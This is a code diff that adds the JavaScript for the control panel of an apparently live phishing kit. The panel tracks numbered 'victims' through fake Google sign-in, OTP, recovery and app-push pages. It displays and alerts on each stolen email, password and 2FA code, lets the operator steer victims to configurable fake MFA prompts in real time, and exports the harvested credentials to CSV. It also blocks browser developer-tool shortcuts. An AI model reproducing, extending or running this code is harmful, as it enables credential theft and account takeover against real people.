+    function loadTheme(){const saved=localStorage.getItem('panelTheme')||'dark';setTheme(saved,false);}
+    function setTheme(theme,save=true){
+      document.documentElement.setAttribute('data-theme',theme);
+      qsa('.theme-option').forEach(el=>el.classList.remove('active'));
+      const btn=qs(`#theme${theme.charAt(0).toUpperCase()+theme.slice(1)}`);
+      if(btn)btn.classList.add('active');
+      qsa('.bg-layer').forEach(el=>el.classList.toggle('active',el.id===`bg${theme.replace('theme','')}`));
+      qsa('.theme-thumb').forEach(el=>el.classList.toggle('active',el.dataset.theme===theme));
+      if(save)localStorage.setItem('panelTheme',theme);
+    }
+
+    
+    function updateClock(){const now=new Date(),h=now.getHours(),m=now.getMinutes(),s=h>=12?'pm':'am';qs('#clock').textContent=`${h%12||12}:${m.toString().padStart(2,'0')}${s}`;}
+    updateClock();setInterval(updateClock,1000);
+
+    
+    function showAlert(type,title,desc,victimNum){
+      if(isFirstLoad)return;
+      const container=qs('#alert-container');
+      const alert=document.createElement('div');
+      alert.className=`alert alert-${type}`;
+      alert.innerHTML=`<div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕'}[type]}</div><div class="alert-content"><div class="alert-title">${title}</div><div class="alert-desc">${desc}</div><div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div></div>`;
+      alert.onclick=()=>alert.remove();
+      container.appendChild(alert);
+      setTimeout(()=>alert.remove(),5000);
+    }
+
+    
+    function pageTitle(f){
+      if(f==='success'||f==='approved')return 'APPROVED';
+      switch(f){
+        case 'index.html':        return 'EMAIL';
+        case 'welcome.html':      return 'PASSWORD';
+        case 'otp.html':          return 'OTP';
+        case 'recovery.html':     return 'RECOVERY';
+        case 'verification.html': return 'APP PUSH';
+        case 'auth.html':         return 'GAUTH';
+        case 'verify.html':       return 'APP PUSH #';
+        default: return f;
+      }
+    }
+
+    
+    function statusText(s){
+      if(s.page==='success'||s.status==='approved') return '';
+      if(s.page==='index.html'&&s.entered)          return '<div style="font-size:11px;color:var(--green)">SUBMITTED</div>';
+      if(s.page==='welcome.html'&&s.password)        return '<div style="font-size:11px;color:var(--green)">SUBMITTED</div>';
+      if(s.page==='otp.html'&&s.otp)                return '<div style="font-size:11px;color:var(--green)">SUBMITTED</div>';
+      if(s.page==='otp.html')                        return s.twoFANumber?`<div style="font-size:11px;color:var(--blue)">WAITING ···${s.twoFANumber}</div>`:'<div style="font-size:11px;color:var(--blue)">WAITING...</div>';
+      if(s.page==='recovery.html'&&s.twofaCode)      return '<div style="font-size:11px;color:var(--green)">CODE ENTERED</div>';
+      if(s.page==='recovery.html')                   return s.twoFANumber?`<div style="font-size:11px;color:var(--blue)">WAITING #${s.twoFANumber}</div>`:'<div style="font-size:11px;color:var(--blue)">WAITING...</div>';
+      if(s.page==='verification.html'&&s.twofaCode)  return '<div style="font-size:11px;color:var(--green)">CODE ENTERED</div>';
+      if(s.page==='verification.html')               return '<div style="font-size:11px;color:var(--blue)">WAITING...</div>';
+      if(s.page==='auth.html'&&s.twofaCode)          return '<div style="font-size:11px;color:var(--green)">SUBMITTED</div>';
+      if(s.page==='auth.html')                       return '<div style="font-size:11px;color:var(--blue)">WAITING...</div>';
+      if(s.page==='verify.html')                     return s.twoFANumber?`<div style="font-size:11px;color:var(--blue)">PUSH #${s.twoFANumber}</div>`:'<div style="font-size:11px;color:var(--blue)">WAITING...</div>';
+      return '<div style="font-size:11px;color:var(--text-muted)">WAITING...</div>';
+    }
+
+    function isApproved(s){return s.page==='success'||s.status==='approved';}
+
+    
+    function actionButtons(s){
+      let html='<div style="display:flex;gap:6px;flex-wrap:wrap;">';
+      html+=`<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title=""><img src="/images/description-svgrepo-com.svg"></button>`;
+      if(isApproved(s)) return html+'</div>';
+
+      if(s.page==='index.html'&&s.entered){
+        
+        html+=`<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html+=`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title=""><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='welcome.html'&&s.password){
+        
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html+=`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title=""><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='otp.html'&&!s.otp){
+        
+      }
+      else if(s.page==='otp.html'&&s.otp){
+        
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html+=`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title=""><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='recovery.html'){
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html+=`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title=""><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='verification.html'){
+        
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='auth.html'&&s.twofaCode){
+        
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html+=`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title=""><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if(s.page==='auth.html'){
+        
+      }
+      else if(s.page==='verify.html'){
+        
+        html+=`<button class="icon-btn continue" onclick="showRedirectModal('${s.sid}')" title=""><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+      }
+      return html+'</div>';
+    }
+
+    
+    function checkChanges(newSessions){
+      if(isFirstLoad){lastSessions=new Map(newSessions.map(s=>[s.sid,{...s}]));isFirstLoad=false;return;}
+      newSessions.forEach(s=>{
+        const old=lastSessions.get(s.sid);
+        if(!old){
+          showAlert('info','NEW SESSION',`Connected from ${s.ip}`,s.victimNum);
+          if(s.entered)showAlert('success','SUBMITTED',`Email: ${s.email}`,s.victimNum);
+        } else {
+          if(!old.entered&&s.entered)             showAlert('success','SUBMITTED',`Email: ${s.email}`,s.victimNum);
+          if(!old.password&&s.password)           showAlert('success','SUBMITTED',`Password: ${s.password}`,s.victimNum);
+          if(!old.otp&&s.otp)                     showAlert('success','SUBMITTED',`OTP: ${s.otp}`,s.victimNum);
+          if(!old.twofaCode&&s.twofaCode)         showAlert('success','SUBMITTED',`Code: ${s.twofaCode}`,s.victimNum);
+          if(s.twoFANumber&&(!old.twoFANumber||old.twoFANumber!==s.twoFANumber))showAlert('info','OTP',`#${s.twoFANumber}`,s.victimNum);
+          if((old.page!=='success'&&s.page==='success')||(old.status!=='approved'&&s.status==='approved'))showAlert('success','LOGIN APPROVED','Victim approved',s.victimNum);
+        }
+      });
+      lastSessions=new Map(newSessions.map(s=>[s.sid,{...s}]));
+    }
+
+    
+    function render(d){
+      qs('#userName').textContent=d.username;
+      qs('#settingsUser').textContent=d.username;
+      qs('#total').textContent=d.totalVictims;
+      qs('#success').textContent=d.success;
+      qs('#domainLink').textContent=d.domain||'localhost';
+      qs('#domainLink').href=d.domain||'http://localhost';
+      qs('#statTotal').textContent=d.totalVictims;
+      qs('#statSuccess').textContent=d.success;
+      qs('#active').textContent=d.sessions.filter(s=>!isApproved(s)).length;
+      const body=qs('#tbl tbody'),empty=qs('#empty');
+      if(!d.sessions.length){body.innerHTML='';empty.style.display='block';return;}
+      empty.style.display='none';
+      body.innerHTML=d.sessions.map(s=>{
+        const approved=isApproved(s),isSelected=selectedSessions.has(s.sid);
+        return `<tr data-sid="${s.sid}" class="${approved?'approved':''}">
+          <td class="select-col">${!approved?`<div class="checkbox-custom session-checkbox ${isSelected?'checked':''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}',event)"></div>`:''}</td>
+          <td>${s.victimNum}</td>
+          <td><span class="cred" onclick="copyToClipboard('${s.email||''}',this)">${s.email||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.password||''}',this)">${s.password||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.otp||''}',this)">${s.otp||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.twofaCode||''}',this)">${s.twofaCode||'—'}</span></td>
+          <td><a class="ip-link" onclick="openIpLookup('${s.ip}')">${s.ip}</a></td>
+          <td>${s.platform}</td><td>${s.browser}</td>
+          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td>${actionButtons(s)}</td>
+        </tr>`;
+      }).join('');
+      updateSelectionUI();
+    }
+
+    
+    function toggleSelect(sid,event){event.stopPropagation();selectedSessions.has(sid)?selectedSessions.delete(sid):selectedSessions.add(sid);updateSelectionUI();}
+    function toggleSelectAll(){const all=jsonData.sessions.filter(s=>!isApproved(s)).map(s=>s.sid);if(selectedSessions.size===all.length)selectedSessions.clear();else all.forEach(sid=>selectedSessions.add(sid));updateSelectionUI();}
+    function clearSelection(){selectedSessions.clear();updateSelectionUI();}
+    function updateSelectionUI(){
+      const count=selectedSessions.size;
+      qs('#selectedCount').textContent=count;
+      qs('#batchActions').classList.toggle('active',count>0);
+      const activeSids=jsonData.sessions.filter(s=>!isApproved(s)).map(s=>s.sid);
+      qs('#selectAllBox').classList.toggle('checked',count>0&&count===activeSids.length);
+      qsa('.session-checkbox').forEach(box=>box.classList.toggle('checked',selectedSessions.has(box.dataset.sid)));
+    }
+    async function deleteSelected(){
+      if(!confirm(`Delete ${selectedSessions.size} sessions?`))return;
+      await Promise.all(Array.from(selectedSessions).map(sid=>fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',sid})})));
+      selectedSessions.clear();updateSelectionUI();load();
+    }
+    function openIpLookup(ip){window.open(`https://db-ip.com/${ip.split(':')[0]}`,'_blank');}
+
+    
+    function showRedirectModal(sid){pendingRedirectSid=sid;qs('#redirectModal').style.display='flex';}
+    function closeRedirectModal(keepSid){qs('#redirectModal').style.display='none';if(!keepSid)pendingRedirectSid=null;}
+
+    function open2SVConfig(page){
+      pending2SVPage=page;
+      pending2SVIsUpdate=false;
+      const session=jsonData.sessions.find(s=>s.sid===pendingRedirectSid);
+      closeRedirectModal(true);
+      _buildConfigModal(page,session);
+    }
+
+    function openUpdateConfig(sid,page){
+      pendingRedirectSid=sid;
+      pending2SVPage=page;
+      pending2SVIsUpdate=true;
+      const session=jsonData.sessions.find(s=>s.sid===sid);
+      _buildConfigModal(page,session);
+    }
+
+    async function redirect2SVDirect(page){
+      if(!pendingRedirectSid)return;
+      const payload={action:'redirect',sid:pendingRedirectSid,target:page+'.html'};
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+      closeRedirectModal();
+      load();
+    }
+
+    function _buildConfigModal(page,session){
+      const configs={
+        otp:{
+          title:'CONFIGURE:',
+          body:`<div class="sv-field">
+            <label class="sv-label">Last 2 digits of phone</label>
+            <input class="sv-input" id="sv_phoneDigits" maxlength="2" placeholder="55" autocomplete="off" value="${session?.twoFANumber||'55'}" oninput="document.getElementById('sv_preview').textContent=this.value||'55'">
+            <div class="sv-hint">Page displays: <code>•••• ••• •<span id="sv_preview">${session?.twoFANumber||'55'}</span></code></div>
+          </div>`
+        },
+        recovery:{
+          title:'CONFIGURE:',
+          body:`<div class="sv-field">
+            <label class="sv-label">Push prompt</label>
+            <input class="sv-input" id="sv_recoveryNum" maxlength="2" placeholder="67" autocomplete="off" value="${session?.twoFANumber||'67'}">
+            <div class="sv-hint">tap Yes on the prompt, then tap <code>67</code></div>
+          </div>
+          <div class="sv-field">
+            <label class="sv-label">Recovery email</label>
+            <input class="sv-input" id="sv_recoveryPrefix" maxlength="3" placeholder="btc" autocomplete="off" value="${session?.recoveryPrefix||''}" oninput="updateRecoveryPreview()">
+          </div>
+          <div class="sv-field">
+            <input class="sv-input" id="sv_recoveryDomain" placeholder="gmail.com" autocomplete="off" value="${session?.recoveryDomain||''}" oninput="updateRecoveryPreview()">
+            <div class="sv-hint"><code id="sv_recoveryPreview">${session?.recoveryPrefix&&session?.recoveryDomain?session.recoveryPrefix+'•••••••••@'+session.recoveryDomain:'btc•••••••••@gmail.com'}</code></div>
+          </div>`
+        },
+        verify:{
+          title:'CONFIGURE:',
+          body:`<div class="sv-field">
+            <label class="sv-label">Push prompt</label>
+            <input class="sv-input" id="sv_verifyNum" maxlength="2" placeholder="67" autocomplete="off" value="${session?.twoFANumber||'67'}" oninput="document.getElementById('sv_vpreview').textContent=this.value||'67'">
+            <div class="sv-hint">Open the Gmail app on iPhone — tap Yes, then tap <strong><span id="sv_vpreview">${session?.twoFANumber||'67'}</span></strong> to verify.</div>
+          </div>`
+        }
+      };
+
+      setTimeout(()=>{
+        const inp=qs('#sv_verifyNum');
+        if(inp)inp.addEventListener('input',function(){
+          const v2=document.getElementById('sv_vpreview2');
+          if(v2)v2.textContent=this.value||'67';
+        });
+      },50);
+
+      const cfg=configs[page];
+      if(!cfg)return;
+      qs('#twoSVTitle').textContent=cfg.title;
+      qs('#twoSVBody').innerHTML=cfg.body;
+      qs('#twoSVSaveBtn').textContent=pending2SVIsUpdate?'Update Config':'CONTINUE';
+      qs('#twoSVModal').style.display='flex';
+    }
+
+    function closeTwoSVModal(){qs('#twoSVModal').style.display='none';pendingRedirectSid=null;pending2SVPage=null;pending2SVIsUpdate=false;}
+
+    function updateRecoveryPreview(){
+      const el=document.getElementById('sv_recoveryPreview');
+      const prefix=(document.getElementById('sv_recoveryPrefix')?.value||'').trim();
+      const domain=(document.getElementById('sv_recoveryDomain')?.value||'').trim();
+      if(el)el.textContent=(prefix||'btc')+'•••••••••@'+(domain||'gmail.com');
+    }
+
+    async function saveTwoSVConfig(){
+      if(!pendingRedirectSid||!pending2SVPage)return;
+      const target=pending2SVPage+'.html';
+      let payload={action:pending2SVIsUpdate?'set-2fa-number':'redirect',sid:pendingRedirectSid,target};
+
+      if(pending2SVPage==='otp'){
+        const d=(qs('#sv_phoneDigits')?.value||'').trim();
+        if(!d.match(/^\d{2}$/)){alert('Enter a valid 2-digit phone suffix (e.g. 55)');return;}
+        payload.phoneSuffix=d;
+        if(!pending2SVIsUpdate)payload.twoFANumber=d;
+        else{payload.action='set-2fa-number';payload.twoFANumber=d;delete payload.target;}
+      }
+      else if(pending2SVPage==='recovery'){
+        const num=(qs('#sv_recoveryNum')?.value||'').trim();
+        const prefix=(qs('#sv_recoveryPrefix')?.value||'').trim();
+        const domain=(qs('#sv_recoveryDomain')?.value||'').trim();
+        if(!num.match(/^\d{2}$/)){alert('Enter a valid 2-digit number (e.g. 67)');return;}
+        if(!prefix){alert('Enter the first 3 characters of the recovery email');return;}
+        if(!domain){alert('Enter the recovery email domain (e.g. gmail.com)');return;}
+        const recoveryEmail=prefix+'•••••••••@'+domain;
+        payload.twoFANumber=num;payload.recoveryEmail=recoveryEmail;payload.recoveryPrefix=prefix;payload.recoveryDomain=domain;
+        if(pending2SVIsUpdate){payload.action='set-2fa-number';delete payload.target;}
+      }
+      else if(pending2SVPage==='verify'){
+        const num=(qs('#sv_verifyNum')?.value||'').trim();
+        if(!num.match(/^\d{2}$/)){alert('Enter a valid 2-digit push number (e.g. 67)');return;}
+        payload.twoFANumber=num;
+        if(pending2SVIsUpdate){payload.action='set-2fa-number';delete payload.target;}
+      }
+
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+      closeTwoSVModal();
+      load();
+    }
+
+    
+    async function skip2FA(){
+      if(!pendingRedirectSid)return;
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'skip2fa',sid:pendingRedirectSid})});
+      closeRedirectModal();load();
+    }
+
+    
+    function showDetail(sid){
+      const s=jsonData.sessions.find(x=>x.sid===sid);if(!s)return;
+      currentSid=sid;const approved=isApproved(s);
+      qs('#modalTitle').textContent=`#${s.victimNum}${approved?' (APPROVED)':''}`;
+      qs('#modalSubtitle').textContent=`${s.ip} • Connected ${fmtDate(s.dateStr)}`;
+      const activityHtml=s.activityLog&&s.activityLog.length?s.activityLog.slice().reverse().map(log=>`<div class="activity-item"><div class="activity-meta"><div class="activity-action">${log.action}</div>${log.detail?`<div class="activity-detail">${log.detail}</div>`:''}</div><div class="activity-time">${fmt(log.time)}</div></div>`).join(''):'<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
+      const extraRows=[
+        s.recoveryEmail?`<div class="info-section"><div class="info-label">Recovery Email</div><div class="info-value mono" onclick="copyToClipboard('${s.recoveryEmail}',this)">${s.recoveryEmail}</div></div>`:'',
+        s.appName?`<div class="info-section"><div class="info-label">App Name</div><div class="info-value mono">${s.appName}</div></div>`:''
+      ].join('');
+      qs('#modalBody').innerHTML=`
+        <div class="info-grid">
+          <div class="info-section"><div class="info-label">Session ID</div><div class="info-value mono" style="font-size:11px">${s.sid}</div></div>
+          <div class="info-section"><div class="info-label">Current Page</div><div class="info-value" style="color:${approved?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}${approved?' ✓':''}</div></div>
+          <div class="info-section"><div class="info-label">Email</div><div class="info-value mono" onclick="copyToClipboard('${s.email||''}',this)">${s.email||'—'}</div></div>
+          <div class="info-section"><div class="info-label">Password</div><div class="info-value mono" onclick="copyToClipboard('${s.password||''}',this)">${s.password||'—'}</div></div>
+          <div class="info-section"><div class="info-label">GAuth Code</div><div class="info-value mono" onclick="copyToClipboard('${s.twofaCode||''}',this)">${s.twofaCode||'—'}</div></div>
+          <div class="info-section"><div class="info-label">OTP Code</div><div class="info-value mono" onclick="copyToClipboard('${s.otp||''}',this)">${s.otp||'—'}</div></div>
+          ${extraRows}
+          <div class="info-section full-width"><div class="info-label">System Information</div>
+            <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:8px">
+              <div><div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Platform</div><div style="font-size:13px;font-weight:500">${s.platform}</div></div>
+              <div><div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Browser</div><div style="font-size:13px;font-weight:500">${s.browser}</div></div>
+              <div><div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">IP Address</div><div style="font-size:13px;font-weight:500"><a class="ip-link" onclick="openIpLookup('${s.ip}')">${s.ip}</a></div></div>
+            </div>
+            <div style="margin-top:12px"><div style="font-size:11px;color:var(--text-muted);margin-bottom:4px">User Agent</div><div class="info-value small">${s.ua}</div></div>
+          </div>
+        </div>
+        <div class="activity-section">
+          <div class="activity-title">Activity Log (${s.activityLog?s.activityLog.length:0} events)</div>
+          <div class="activity-log">${activityHtml}</div>
+        </div>
+        ${!approved
+          ?`<div class="delete-section"><div class="delete-info">Permanently remove this session</div><button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button></div>`
+          :`<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:center;"><div style="color:var(--green);font-size:13px;">✓ Session approved and completed</div><button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete</button></div>`
+        }`;
+      qs('#modal').style.display='flex';
+    }
+    function closeModal(){qs('#modal').style.display='none';currentSid=null;}
+
+    
+    function openSettings(){qs('#settingsModal').style.display='flex';}
+    function closeSettings(){qs('#settingsModal').style.display='none';}
+    function showConfirmDelete(){closeSettings();qs('#confirmModal').style.display='flex';}
+    function closeConfirm(){qs('#confirmModal').style.display='none';}
+    async function executeDelete(){await fetch('/api/refresh',{method:'POST'});lastSessions.clear();selectedSessions.clear();isFirstLoad=true;closeConfirm();load();}
+    function confirmDelete(sid){if(confirm('Delete this session? Cannot be undone.')){act('delete',sid);closeModal();}}
+
+    async function act(action,sid){
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
+      load();
+    }
+
+    async function copyToClipboard(text,element){
+      if(!text||text==='—')return;
+      try{await navigator.clipboard.writeText(text);element.classList.add('copied');setTimeout(()=>element.classList.remove('copied'),1000);}
+      catch(err){const r=document.createRange();r.selectNode(element);window.getSelection().removeAllRanges();window.getSelection().addRange(r);setTimeout(()=>window.getSelection().removeAllRanges(),1000);}
+    }
+
+    
+    qs('#exportBtn').onclick=()=>{
+      const rows=jsonData.sessions.filter(s=>s.email&&s.password);
+      if(!rows.length){alert('No sessions with Email and Password to export.');return;}
+      const headers=['Victim#','Email','Password','OTP','GAuth Code','Recovery Email','App Name','IP','Platform','Browser','Status','Connected At'];
+      const csv=[headers,...rows.map(s=>[s.victimNum,s.email||'',s.password||'',s.otp||'',s.twofaCode||'',s.recoveryEmail||'',s.appName||'',s.ip,s.platform,s.browser,pageTitle(s.page),fmtDate(s.dateStr)])].map(r=>r.map(c=>`"${String(c).replace(/"/g,'""')}"`).join(',')).join('\n');
+      const blob=new Blob([csv],{type:'text/csv'});
+      const url=window.URL.createObjectURL(blob);
+      const a=document.createElement('a');a.href=url;a.download=`sessions_${new Date().toISOString().slice(0,10)}.csv`;
+      document.body.appendChild(a);a.click();document.body.removeChild(a);window.URL.revokeObjectURL(url);
+    };
+
+    
+    qs('#logoutBtn').onclick=async()=>{lastSessions.clear();selectedSessions.clear();isFirstLoad=true;await fetch('/panel/logout',{method:'POST'});location.replace('/panel');};
+    qs('#settingsBtn').onclick=openSettings;
+
+    
+    async function load(){
+      const d=await fetch('/api/panel').then(r=>r.json());
+      if(d.error)return location.replace('/panel');
+      jsonData=d;checkChanges(d.sessions);render(d);
+      setTimeout(load,1000);
+    }
+    loadTheme();load();
+    
+document.addEventListener('keydown', function(e) {
+  if (
+    e.key === 'F12' ||
+    (e.ctrlKey && e.key.toLowerCase() === 'u') ||
+    (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase()))
+  ) {
+    e.preventDefault();
+  }
+});
+</script>
+</body>
+</html>
